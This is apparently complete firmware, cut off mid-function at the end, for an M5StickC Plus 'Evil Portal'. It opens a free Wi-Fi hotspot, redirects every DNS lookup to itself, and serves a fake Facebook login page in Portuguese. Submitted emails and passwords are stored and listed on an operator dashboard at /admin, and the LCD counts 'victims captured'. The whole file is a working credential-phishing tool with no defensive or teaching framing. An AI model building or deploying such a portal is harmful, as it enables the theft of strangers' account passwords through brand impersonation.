#include <M5StickCPlus.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
 
 
// Based on https://community.dfrobot.com/makelog-313463.html
// Modified font and text placement for StickC-Plus, further improvements added
// Code BY: https://github.com/n0xa/
// Moded BY: https://github.com/Kuush01
// Moded BY: https://github.com/raphntc

 
// User configuration
#define SSID_NAME "Wi-Fi Gratis"
#define SUBTITLE "E-CORP service."
#define POST_TITLE "Validando Acesso..."
#define POST_BODY "Sua conta esta sendo validada. Aguarde ate 5 minutos pela conexao do dispositivo.</br>Obrigado."
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"

int capcount = 0;           // lifetime captures (shown on the LCD)
int storedCount = 0;        // entries currently in memory (reset by /clear)
int previous = -1;          // last count drawn on screen; -1 forces the first redraw
const int BUILTIN_LED = 10; // M5StickC Plus internal LED (active LOW)

// Non-blocking LED blink state (armed when a capture arrives)
int blinkRemaining = 0;                    // LED toggles left to perform
unsigned long lastBlink = 0;               // millis() of last toggle
const unsigned long BLINK_INTERVAL = 150;  // ms between toggles

// LCD theme (RGB565) + live status-dot state
#define RGB565(r, g, b) ((uint16_t)(((r & 0xF8) << 8) | ((g & 0xFC) << 3) | ((b) >> 3)))
#define C_BG      RGB565(15, 17, 21)     // background
#define C_ACCENT  RGB565(24, 119, 242)   // header bar (blue)
#define C_ACCENT2 RGB565(120, 170, 255)  // gateway value (light blue)
#define C_OK      RGB565(48, 163, 108)   // "active" dot
#define C_OKDIM   RGB565(22, 60, 42)     // "active" dot, off phase
#define C_MUTED   RGB565(138, 147, 166)  // labels
#define C_CARD    RGB565(26, 29, 36)     // counter card
#define C_COUNT   RGB565(255, 196, 0)    // victim count (amber)
#define C_DANGER  RGB565(229, 72, 77)    // low-battery fill (red)
#define C_BONE    RGB565(236, 239, 244)  // skull bone (off-white)
#define C_EYE     RGB565(255, 40, 40)    // skull eyes, bright glow
#define C_EYEDIM  RGB565(120, 16, 16)    // skull eyes, dim glow
bool dotOn = false;

// -------- App menu / state machine --------
// The device boots into a menu (Tools / Configuration / Exit) instead of
// launching the portal straight away. The portal AP + web server only come
// up when the operator chooses Tools > Start Evil Portal.
enum AppState { ST_MENU_MAIN, ST_MENU_TOOLS, ST_MENU_CONFIG, ST_RUNNING };
AppState appState = ST_MENU_MAIN;
int menuSel = 0;              // highlighted row in the current menu
bool portalStarted = false;  // AP + web server currently up?

// Configuration options (toggled from the Configuration menu)
bool soundOn = true;             // beep when a credential is captured
bool ledBlinkOn = true;          // blink the LED when a credential is captured
uint8_t brightLevel = 2;         // screen brightness index (0..2)
const uint8_t BRIGHT_VALS[3] = {8, 11, 14};
 
// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway
 
String Credentials = "";
unsigned long lastTick = 0;
DNSServer dnsServer; WebServer webServer(80);
 
String input(String argName) {
  String a = webServer.arg(argName);
  a = a.substring(0, 200);  // actually limit length (substring returns a copy)
  a.replace("&", "&amp;");  // escape & first so later entities aren't double-escaped
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.replace("\"", "&quot;");
  return a;
}

// Format a millis() value as H:MM:SS (used for "captured at" and uptime).
String fmtUptime(unsigned long ms) {
  unsigned long s = ms / 1000;
  char buf[16];
  snprintf(buf, sizeof(buf), "%lu:%02lu:%02lu", s / 3600, (s % 3600) / 60, s % 60);
  return String(buf);
}

String footer() {
  return
    "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}
 
String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}
 
// Operator dashboard served at /creds. Self-contained dark-theme page:
// stat tiles, a table of captures (newest first), and action buttons.
String creds() {
  String css =
    ":root{--bg:#0f1115;--card:#171a21;--line:#262b36;--txt:#e6e9ef;--mut:#8a93a6;--accent:#4169e1;--danger:#e5484d}"
    "*{box-sizing:border-box}"
    "body{margin:0;background:var(--bg);color:var(--txt);font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;line-height:1.5}"
    ".top{background:linear-gradient(90deg,#1b2a6b,#4169e1);padding:18px 20px}"
    ".top h1{margin:0;font-size:20px;letter-spacing:.3px}"
    ".top p{margin:3px 0 0;color:#cdd6ff;font-size:13px}"
    ".wrap{max-width:900px;margin:0 auto;padding:16px}"
    ".stats{display:flex;gap:12px;flex-wrap:wrap;margin:16px 0}"
    ".tile{flex:1;min-width:140px;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px 16px}"
    ".tile .k{color:var(--mut);font-size:12px;text-transform:uppercase;letter-spacing:.5px}"
    ".tile .v{font-size:26px;font-weight:700;margin-top:4px}"
    ".tile .v.accent{color:#8ab0ff}"
    ".bar{display:flex;gap:10px;flex-wrap:wrap;margin:8px 0 16px}"
    ".btn{display:inline-block;padding:9px 14px;border-radius:10px;border:1px solid var(--line);background:var(--card);color:var(--txt);text-decoration:none;font-size:14px;cursor:pointer}"
    ".btn:hover{border-color:var(--accent)}"
    ".btn.primary{background:var(--accent);border-color:var(--accent);color:#fff}"
    ".btn.danger{background:transparent;border-color:var(--danger);color:#ff9a9d}"
    ".btn.danger:hover{background:var(--danger);color:#fff}"
    "table{width:100%;border-collapse:collapse;background:var(--card);border:1px solid var(--line);border-radius:12px;overflow:hidden}"
    "thead th{background:#10131a;color:var(--mut);text-align:left;font-size:12px;text-transform:uppercase;letter-spacing:.5px;padding:10px 12px;border-bottom:1px solid var(--line)}"
    "tbody td{padding:11px 12px;border-bottom:1px solid var(--line);vertical-align:top;word-break:break-word}"
    "tbody tr:last-child td{border-bottom:none}"
    "tbody tr:nth-child(even){background:rgba(255,255,255,.02)}"
    ".idx{color:var(--mut);width:42px}"
    ".pass code{background:#0c0f14;border:1px solid var(--line);border-radius:6px;padding:2px 6px;color:#7ee2b8;font-family:ui-monospace,Menlo,Consolas,monospace}"
    ".time{color:var(--mut);white-space:nowrap}"
    ".empty{background:var(--card);border:1px dashed var(--line);border-radius:12px;padding:44px 20px;text-align:center;color:var(--mut)}"
    ".note{color:var(--mut);font-size:12px;margin:14px 0 30px;text-align:center}";

  String body;
  if (storedCount == 0) {
    body = "<div class=\"empty\">No credentials captured yet.<br>They will appear here as devices submit the portal form.</div>";
  } else {
    body = "<table><thead><tr><th class=\"idx\">#</th><th>Email</th><th>Password</th><th class=\"time\">Captured (uptime)</th></tr></thead><tbody>"
           + Credentials + "</tbody></table>";
  }

  return
    "<!DOCTYPE html><html lang=\"en\"><head>"
    "<meta charset=\"UTF-8\">"
    "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
    "<meta http-equiv=\"refresh\" content=\"15\">"
    "<title>" + String(SSID_NAME) + " :: " + PASS_TITLE + "</title>"
    "<style>" + css + "</style></head><body>"
    "<div class=\"top\"><h1>Portal Evil HUEBR</h1><p>Captured credentials dashboard</p></div>"
    "<div class=\"wrap\">"
    "<div class=\"stats\">"
    "<div class=\"tile\"><div class=\"k\">Stored entries</div><div class=\"v accent\">" + String(storedCount) + "</div></div>"
    "<div class=\"tile\"><div class=\"k\">Total captures</div><div class=\"v\">" + String(capcount) + "</div></div>"
    "<div class=\"tile\"><div class=\"k\">Uptime</div><div class=\"v\">" + fmtUptime(millis()) + "</div></div>"
    "</div>"
    "<div class=\"bar\">"
    "<a class=\"btn primary\" href=\"/admin\">&#8635; Refresh</a>"
    "<a class=\"btn danger\" href=\"/clear\" onclick=\"return confirm('Clear all captured credentials? This cannot be undone.')\">Clear all</a>"
    "<a class=\"btn\" href=\"/\">Back to portal</a>"
    "</div>"
    + body +
    "<p class=\"note\">Data is stored in RAM only and is lost on reboot. This page auto-refreshes every 15 s.</p>"
    "</div></body></html>";
}
 
String index() {
  String htmlContent = "<!DOCTYPE html><html lang=\"pt-br\"><head>"
    "<meta charset=\"UTF-8\">"
    "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">"
    "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
    "<style>"
    "@charset \"utf-8\";"
    "* {box-sizing: border-box;text-decoration: none;}"
    "body {display: flex;flex-direction: row;justify-content: center;align-items: center;margin-top: 40px;font-family: Helvetica, sans-serif;background: #F3F2F2;}"
    "div#corpo h1 {text-align: center;color: #4169e1;font-size: 50px;}"
    "div#login {border-radius: 6px;width: 350px;box-shadow: 0 2px 4px rgba(0 ,0 ,0 ,0.3), 0 8px 16px rgba(0 ,0 ,0 ,0.3);}"
    "div#login form {width: 100px 100px;padding: 16px;background-color: white;border-radius: 8px;}"
    "div#login a {padding-left: 80px;margin-top: 16px;display: block;}"
    "div#login p {text-align: center;font-size: 16px;margin-top: 5px;}"
    "div#login input {width: 100%;margin-bottom: 10px;padding: 16px;border-radius: 6px;border: 1px solid #c3c5c9;}"
    "div#login input[placeholder] {font-size: 16px;opacity: 50%;}"
    "div#login button {background-color: #4169e1;border-radius: 8px;border: 1px solid white;width: 100%;padding: 15px;color: white;font-family: Helvetica, sans-serif;font-size: 16px;font-weight: bold;cursor: pointer;}"
    "</style>"
    "<link rel=\"shortcut icon\" href=\"favicon.ico\" type=\"image/x-icon\">"
    "<title>Facebook</title>"
    "</head>"
    "<body>"
    "<div id=\"corpo\">"
    "<h1>facebook</h1>"
    "<div id=\"login\">"
    "<form name=\"login-form\" method=\"POST\" action=\"/post\">"
    "<p>Entrar no Facebook</p>"
    "<input type=\"email\" autocomplete=\"email\" name=\"email\" id=\"email\" placeholder=\"Email ou telefone\" required>"
    "<input type=\"password\" name=\"password\" id=\"password\" placeholder=\"Senha\" required>"
    "<button type=\"submit\" name=\"submit\" id=\"submit\">Entrar</button>"
    "<a href=\"#\">Esqueceu a senha?</a>"
    "</form>"
    "</div>"
    "</div>"
    "</body>"
    "</html>";
 
  return htmlContent;
}
 
// Standalone "please wait / validating" page shown after a submission.
// Pure CSS/JS (device is offline): animated Wi-Fi icon, indeterminate progress
// bar, spinner and a live countdown. Text comes from POST_TITLE / POST_BODY.
String waiting() {
  return
    "<!DOCTYPE html><html lang=\"pt-br\"><head>"
    "<meta charset=\"UTF-8\">"
    "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
    "<title>" + String(POST_TITLE) + "</title>"
    "<style>"
    "*{box-sizing:border-box;margin:0;padding:0}"
    "body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(160deg,#eef3fb,#dce7f7);font-family:Helvetica,Arial,sans-serif;color:#1c1e21;padding:20px}"
    ".card{background:#fff;width:100%;max-width:380px;border-radius:18px;padding:34px 28px;text-align:center;box-shadow:0 10px 30px rgba(24,119,242,.15),0 2px 8px rgba(0,0,0,.06)}"
    ".wifi{width:76px;height:76px;margin:0 auto 18px}"
    ".wifi svg{width:100%;height:100%}"
    ".a{fill:none;stroke:#1877f2;stroke-width:6;stroke-linecap:round;opacity:.2;animation:pulse 1.8s infinite}"
    ".a2{animation-delay:.2s}.a3{animation-delay:.4s}"
    ".dot{fill:#1877f2}"
    "@keyframes pulse{0%,100%{opacity:.2}40%{opacity:1}}"
    "h1{font-size:22px;color:#1877f2;margin-bottom:10px;font-weight:700}"
    ".msg{font-size:15px;color:#606770;line-height:1.5;margin-bottom:22px}"
    ".track{height:8px;background:#e8edf3;border-radius:99px;overflow:hidden;margin-bottom:18px}"
    ".track i{display:block;height:100%;width:40%;border-radius:99px;background:linear-gradient(90deg,#1877f2,#4fa3ff);animation:slide 1.4s ease-in-out infinite}"
    "@keyframes slide{0%{margin-left:-45%}100%{margin-left:105%}}"
    ".status{display:flex;align-items:center;justify-content:center;gap:8px;font-size:13px;color:#8a8d91}"
    ".spin{width:14px;height:14px;border:2px solid #cdd3dc;border-top-color:#1877f2;border-radius:50%;animation:spin .8s linear infinite}"
    "@keyframes spin{to{transform:rotate(360deg)}}"
    ".foot{margin-top:20px;font-size:12px;color:#b0b3b8}"
    "@media(prefers-reduced-motion){.a,.track i,.spin{animation:none}.a{opacity:.75}}"
    "</style></head><body>"
    "<div class=\"card\">"
    "<div class=\"wifi\"><svg viewBox=\"0 0 100 100\">"
    "<path class=\"a a3\" d=\"M15,45 A48,48 0 0 1 85,45\"/>"
    "<path class=\"a a2\" d=\"M27,56 A33,33 0 0 1 73,56\"/>"
    "<path class=\"a\" d=\"M38,66 A19,19 0 0 1 62,66\"/>"
    "<circle class=\"dot\" cx=\"50\" cy=\"74\" r=\"5\"/>"
    "</svg></div>"
    "<h1>" + String(POST_TITLE) + "</h1>"
    "<p class=\"msg\">" + String(POST_BODY) + "</p>"
    "<div class=\"track\"><i></i></div>"
    "<div class=\"status\"><span class=\"spin\"></span>Tempo estimado: <span id=\"t\">5:00</span></div>"
    "<div class=\"foot\">&#128274; Conex&atilde;o segura</div>"
    "</div>"
    "<script>var s=300,el=document.getElementById('t');setInterval(function(){if(s>0)s--;var m=(s/60)|0,x=s%60;el.textContent=m+':'+(x<10?'0'+x:x);},1000);</script>"
    "</body></html>";
}

String posted() {
  String email = input("email");
  String password = input("password");
  // Newest capture first; one table row per entry (rendered by creds()).
  String row = "<tr><td class=\"idx\">" + String(storedCount) + "</td>"
               "<td>" + email + "</td>"
               "<td class=\"pass\"><code>" + password + "</code></td>"
               "<td class=\"time\">" + fmtUptime(millis()) + "</td></tr>";
  Credentials = row + Credentials;
  return waiting();
}
 
String clear() {
  Credentials = "";
  storedCount = 0;
  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/admin>Back to dashboard</a></center>" + footer();
}
 
// Arm a non-blocking blink: 5 on/off cycles = 10 toggles.
// The toggling itself happens in updateBlink() from loop(), so DNS/HTTP keep serving.
void startBlink() {
  blinkRemaining = 10;
  lastBlink = millis();
  digitalWrite(BUILTIN_LED, LOW); // LED on (active LOW)
}

void updateBlink() {
  if (blinkRemaining > 0 && (millis() - lastBlink) > BLINK_INTERVAL) {
    lastBlink = millis();
    blinkRemaining--;
    // even remaining -> LED off, odd -> LED on
    digitalWrite(BUILTIN_LED, (blinkRemaining % 2 == 0) ? HIGH : LOW);
    if (blinkRemaining == 0) digitalWrite(BUILTIN_LED, HIGH); // make sure it ends off
  }
}

// -------- LCD UI (240x135, rotation 3) --------

// Small "AP active" dot in the top-right of the header bar.
void drawStatusDot(bool on) {
  M5.Lcd.fillCircle(228, 13, 5, on ? C_OK : C_OKDIM);
}

// Estimate battery charge (0-100%) from the AXP192 pack voltage.
// Li-ion maps ~3.0V (empty) to ~4.07V (full) on the M5StickC Plus.
int getBatteryPct() {
  float v = M5.Axp.GetBatVoltage();
  int pct = (int)(((v - 3.0) / (4.07 - 3.0)) * 100.0 + 0.5);
  if (pct > 100) pct = 100;
  if (pct < 0) pct = 0;
  return pct;
}

// Battery gauge: a cell-shaped icon (body + nub) whose fill tracks the charge
// level, with the percentage printed to its left. The outline/text use
// `fg` and the surrounding area is cleared with `bg` so it can sit on the
// dark body (dashboard) or on the blue header bar (menus).
void drawBatteryAt(int bx, int by, uint16_t fg, uint16_t bg) {
  int pct = getBatteryPct();
  const int bw = 26, bh = 13;
  uint16_t col = (pct > 50) ? C_OK : (pct > 20 ? C_COUNT : C_DANGER);

  // Clear the gauge area (percentage width changes with the digit count).
  M5.Lcd.fillRect(bx - 40, by - 2, 40 + bw + 6, bh + 5, bg);

  // Cell body, terminal nub, and proportional fill.
  M5.Lcd.drawRoundRect(bx, by, bw, bh, 2, fg);
  M5.Lcd.fillRect(bx + bw, by + 4, 3, bh - 8, fg);
  int fw = (bw - 4) * pct / 100;
  M5.Lcd.fillRect(bx + 2, by + 2, fw, bh - 4, col);

  // Percentage to the left of the icon.
  M5.Lcd.setTextDatum(MR_DATUM);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(fg, bg);
  M5.Lcd.drawString(String(pct) + "%", bx - 5, by + bh / 2);
}

// Dashboard battery gauge (top-right of the SSID row, on the dark body).
void drawBattery() {
  drawBatteryAt(208, 38, C_MUTED, C_BG);
}

// 8-bit skull bitmap: 14 columns x 16 rows, drawn as chunky pixels.
// 'B' = bone (drawn), anything else = background (eye sockets / nose / mouth
// show through as dark). The last five rows differ between the two frames so
// the jaw drops open and shut -> the skull looks like it's laughing.
#define SK_COLS 14
#define SK_ROWS 16
static const char* SK_CLOSED[SK_ROWS] = {
  "...BBBBBBBB...",  // cranium
  "..BBBBBBBBBB..",
  ".BBBBBBBBBBBB.",
  "BBBBBBBBBBBBBB",
  "BBBBBBBBBBBBBB",
  "BB..BBBBBB..BB",  // eye sockets
  "BB..BBBBBB..BB",
  "BB..BBBBBB..BB",
  "BBBBBB..BBBBBB",  // nose
  "BBBBBB..BBBBBB",
  ".BBBBBBBBBBBB.",
  ".BBBBBBBBBBBB.",  // mouth closed (grin)
  "..BBBBBBBBBB..",
  "..B.B.B.B.B...",  // teeth
  "...BBBBBBBB...",
  ".............."
};
static const char* SK_OPEN[SK_ROWS] = {
  "...BBBBBBBB...",  // cranium (identical top)
  "..BBBBBBBBBB..",
  ".BBBBBBBBBBBB.",
  "BBBBBBBBBBBBBB",
  "BBBBBBBBBBBBBB",
  "BB..BBBBBB..BB",
  "BB..BBBBBB..BB",
  "BB..BBBBBB..BB",
  "BBBBBB..BBBBBB",
  "BBBBBB..BBBBBB",
  ".BBBBBBBBBBBB.",
  ".BBBBBBBBBBBB.",  // upper lip
  "..BBBBBBBBBB..",  // upper teeth
  "..B.B.B.B.B...",  // teeth
  "..............",  // mouth wide open (dark gap)
  "...BBBBBBBB..."   // dropped lower jaw
};

// Render one skull frame. `open` picks the jaw state; `eyeCol` lets the eyes
// pulse between bright and dim red.
void drawSkull(int ox, int oy, int px, bool open, uint16_t eyeCol) {
  const char** rows = open ? SK_OPEN : SK_CLOSED;
  for (int r = 0; r < SK_ROWS; r++) {
    const char* row = rows[r];
    for (int c = 0; c < SK_COLS; c++) {
      if (row[c] == 'B') {
        M5.Lcd.fillRect(ox + c * px, oy + r * px, px, px, C_BONE);
      }
    }
  }
  // Glowing eyes fill the two sockets (cols 2-3 and 10-11, rows 5-7).
  M5.Lcd.fillRect(ox + 2 * px,  oy + 5 * px, 2 * px, 3 * px, eyeCol);
  M5.Lcd.fillRect(ox + 10 * px, oy + 5 * px, 2 * px, 3 * px, eyeCol);
}

// Boot splash: an 8-bit skull that laughs (jaw open/shut, pulsing red eyes,
// bobbing head) with a "HA HA HA!" burst and a progress bar. Runs ~5 seconds.
void bootScreen() {
  M5.Lcd.fillScreen(C_BG);

  // Static elements (drawn once): caption + progress-bar outline.
  M5.Lcd.setTextDatum(MC_DATUM);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_BG);
  M5.Lcd.drawString("PORTAL EVIL HUEBR  -  loading", 120, 112);
  const int bx = 40, by = 122, bw = 160, bh = 8;
  M5.Lcd.drawRoundRect(bx, by, bw, bh, 3, C_MUTED);

  const int px = 5;                 // skull pixel size (14*5 x 16*5 = 70x80)
  const int ox = (240 - SK_COLS * px) / 2;  // centered horizontally
  const int oyBase = 6;
  const unsigned long DURATION = 5000;  // ~5 seconds
  unsigned long start = millis();
  bool open = false;

  while (millis() - start < DURATION) {
    unsigned long el = millis() - start;
    open = !open;
    int bob = open ? 2 : 0;  // head/jaw bob

    // Clear the skull + laugh-text band, then redraw this frame.
    M5.Lcd.fillRect(0, 4, 240, 104, C_BG);
    drawSkull(ox, oyBase + bob, px, open, open ? C_EYE : C_EYEDIM);

    // "HA HA HA!" burst on the open-jaw frames.
    if (open) {
      M5.Lcd.setTextDatum(MC_DATUM);
      M5.Lcd.setTextSize(2);
      M5.Lcd.setTextColor(C_EYE, C_BG);
      M5.Lcd.drawString("HA HA HA!", 120, 98);
    }

    // Progress bar tracks elapsed time.
    int w = (int)((long)(bw - 6) * el / DURATION);
    if (w > bw - 6) w = bw - 6;
    M5.Lcd.fillRoundRect(bx + 3, by + 3, w, bh - 6, 2, C_ACCENT);

    // Short 8-bit "laugh" blip on each open frame (muteable via Config).
    if (soundOn && open) {
      M5.Beep.tone(1500);
      delay(45);
      M5.Beep.tone(1100);
      delay(45);
      M5.Beep.mute();
    }

    delay(180);
  }

  // Ensure the bar reads full before leaving.
  M5.Lcd.fillRoundRect(bx + 3, by + 3, bw - 6, bh - 6, 2, C_ACCENT);
  delay(150);
}

// Full dashboard repaint: header, SSID, gateway, and the victim-count card.
void drawMainScreen() {
  M5.Lcd.fillScreen(C_BG);

  // Header bar
  M5.Lcd.fillRect(0, 0, 240, 26, C_ACCENT);
  M5.Lcd.setTextDatum(MC_DATUM);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE, C_ACCENT);
  M5.Lcd.drawString("PORTAL EVIL HUEBR", 112, 13);
  drawStatusDot(true);

  // SSID
  M5.Lcd.setTextDatum(TL_DATUM);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_BG);
  M5.Lcd.drawString("SSID", 8, 32);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE, C_BG);
  M5.Lcd.drawString(SSID_NAME, 8, 42);

  // Battery gauge (top-right of the SSID row)
  drawBattery();

  // Admin panel link
  M5.Lcd.setTextDatum(TL_DATUM);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_BG);
  M5.Lcd.drawString("ADMIN PANEL - OPEN ON PHONE:", 8, 63);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_ACCENT2, C_BG);
  M5.Lcd.drawString("http://" + APIP.toString() + "/admin", 8, 77);

  // Victim-count card
  M5.Lcd.fillRoundRect(3, 92, 234, 40, 8, C_CARD);
  M5.Lcd.setTextDatum(ML_DATUM);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_CARD);
  M5.Lcd.drawString("VICTIMS CAPTURED", 14, 112);
  M5.Lcd.setTextDatum(MR_DATUM);
  M5.Lcd.setTextSize(4);
  M5.Lcd.setTextColor(C_COUNT, C_CARD);
  M5.Lcd.drawString(String(capcount), 226, 111);
}

void applyBrightness() {
  M5.Axp.ScreenBreath(BRIGHT_VALS[brightLevel]);
}

// Register HTTP routes once. Handlers are safe to attach before the AP is up;
// this runs a single time from setup() so repeated start/stop cycles don't
// stack duplicate handlers.
void registerRoutes() {
  webServer.on("/post", []() {
    capcount++;
    storedCount++;
    webServer.send(HTTP_CODE, "text/html", posted());
    if (soundOn) {
      M5.Beep.tone(4000);
      delay(50);
      M5.Beep.mute();
    }
    if (ledBlinkOn) startBlink();  // non-blocking; loop() redraws the dashboard
  });
  webServer.on("/admin", []() {
    webServer.send(HTTP_CODE, "text/html", creds());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.onNotFound([]() {
    webServer.send(HTTP_CODE, "text/html", index());
  });
}

// Bring the captive-portal AP + DNS + web server up and switch to the
// live dashboard.
void startPortal() {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP);  // DNS spoofing (HTTP only)
  webServer.begin();
  portalStarted = true;

  appState = ST_RUNNING;
  drawMainScreen();
  previous = capcount;  // avoid an immediate redraw on the first loop tick
  dotOn = true;
  lastTick = millis();
}

// Tear the portal down and go back to idle (used when returning to the menu).
void stopPortal() {
  if (portalStarted) {
    dnsServer.stop();
    webServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    portalStarted = false;
  }
  blinkRemaining = 0;
  digitalWrite(BUILTIN_LED, HIGH);  // LED off (active LOW)
}

// -------- Menu rendering + navigation --------

int currentMenuCount() {
  if (appState == ST_MENU_MAIN)  return 3;  // Tools / Configuration / Exit
  if (appState == ST_MENU_TOOLS) return 3;  // Start / Device Info / Back
  return 4;                                 // Beep / LED / Brightness / Back
}

// Repaint the whole menu screen for the current state + selection.
void drawMenu() {
  M5.Lcd.fillScreen(C_BG);

  // Header bar with left-aligned title + battery gauge on the right.
  M5.Lcd.fillRect(0, 0, 240, 26, C_ACCENT);
  M5.Lcd.setTextDatum(ML_DATUM);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE, C_ACCENT);
  const char* title = (appState == ST_MENU_MAIN) ? "MAIN MENU"
                    : (appState == ST_MENU_TOOLS) ? "TOOLS" : "CONFIG";
  M5.Lcd.drawString(title, 8, 13);
  drawBatteryAt(206, 6, TFT_WHITE, C_ACCENT);

  // Build the item labels for this menu.
  String items[4];
  int n = currentMenuCount();
  if (appState == ST_MENU_MAIN) {
    items[0] = "Tools";
    items[1] = "Configuration";
    items[2] = "Exit";
  } else if (appState == ST_MENU_TOOLS) {
    items[0] = "Start Evil Portal";
    items[1] = "Device Info";
    items[2] = "Back";
  } else {
    items[0] = String("Beep: ")       + (soundOn ? "ON" : "OFF");
    items[1] = String("LED blink: ")  + (ledBlinkOn ? "ON" : "OFF");
    items[2] = String("Brightness: ") + String(brightLevel + 1);
    items[3] = "Back";
  }

  // Rows: highlighted item gets the accent background.
  const int y0 = 32, rowH = 22, rowInner = 18;
  for (int i = 0; i < n; i++) {
    int y = y0 + i * rowH;
    bool sel = (i == menuSel);
    M5.Lcd.fillRoundRect(8, y, 224, rowInner, 4, sel ? C_ACCENT : C_CARD);
    M5.Lcd.setTextDatum(ML_DATUM);
    M5.Lcd.setTextSize(2);
    M5.Lcd.setTextColor(sel ? TFT_WHITE : C_MUTED, sel ? C_ACCENT : C_CARD);
    M5.Lcd.drawString(items[i], 16, y + rowInner / 2);
  }

  // Footer hint.
  M5.Lcd.setTextDatum(BC_DATUM);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_BG);
  M5.Lcd.drawString("BtnB: move    BtnA: select", 120, 134);
}

// Blocking info screen; returns to the Tools menu on any button press.
void showDeviceInfo() {
  M5.Lcd.fillScreen(C_BG);
  M5.Lcd.fillRect(0, 0, 240, 26, C_ACCENT);
  M5.Lcd.setTextDatum(ML_DATUM);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE, C_ACCENT);
  M5.Lcd.drawString("DEVICE INFO", 8, 13);

  M5.Lcd.setTextSize(1);
  int y = 34;
  M5.Lcd.setTextColor(C_MUTED, C_BG);  M5.Lcd.drawString("SSID", 8, y);
  M5.Lcd.setTextColor(TFT_WHITE, C_BG); M5.Lcd.drawString(SSID_NAME, 8, y + 10); y += 26;
  M5.Lcd.setTextColor(C_MUTED, C_BG);  M5.Lcd.drawString("ADMIN PANEL", 8, y);
  M5.Lcd.setTextColor(C_ACCENT2, C_BG); M5.Lcd.drawString("http://" + APIP.toString() + "/admin", 8, y + 10); y += 26;
  M5.Lcd.setTextColor(C_MUTED, C_BG);  M5.Lcd.drawString("PORTAL", 8, y);
  M5.Lcd.setTextColor(portalStarted ? C_OK : C_DANGER, C_BG);
  M5.Lcd.drawString(portalStarted ? "RUNNING" : "STOPPED", 8, y + 10);

  M5.Lcd.setTextDatum(BC_DATUM);
  M5.Lcd.setTextColor(C_MUTED, C_BG);
  M5.Lcd.drawString("Press any button to go back", 120, 134);

  while (true) {
    M5.update();
    if (M5.BtnA.wasPressed() || M5.BtnB.wasPressed()) break;
    delay(20);
  }
  appState = ST_MENU_TOOLS;
  menuSel = 1;
  drawMenu();
}

// Blocking confirm screen for Exit. BtnA powers the device off; BtnB cancels.
void doExit() {
  M5.Lcd.fillScreen(C_BG);
  M5.Lcd.setTextDatum(MC_DATUM);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE, C_BG);
  M5.Lcd.drawString("Power off?", 120, 50);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_BG);
  M5.Lcd.drawString("BtnA = Yes       BtnB = No", 120, 90);

  while (true) {
    M5.update();
    if (M5.BtnA.wasPressed()) {
      M5.Lcd.fillScreen(C_BG);
      M5.Lcd.setTextDatum(MC_DATUM);
      M5.Lcd.setTextSize(3);
      M5.Lcd.setTextColor(C_ACCENT2, C_BG);
      M5.Lcd.drawString("Bye!", 120, 60);
      delay(700);
      M5.Axp.PowerOff();
    }
    if (M5.BtnB.wasPressed()) {
      appState = ST_MENU_MAIN;
      menuSel = 2;
      drawMenu();
      return;
    }
    delay(20);
  }
}

// Act on the highlighted item in the current menu.
void selectCurrent() {
  if (appState == ST_MENU_MAIN) {
    if (menuSel == 0)      { appState = ST_MENU_TOOLS;  menuSel = 0; drawMenu(); }
    else if (menuSel == 1) { appState = ST_MENU_CONFIG; menuSel = 0; drawMenu(); }
    else                   { doExit(); }
  } else if (appState == ST_MENU_TOOLS) {
    if (menuSel == 0)      { startPortal(); }           // -> ST_RUNNING
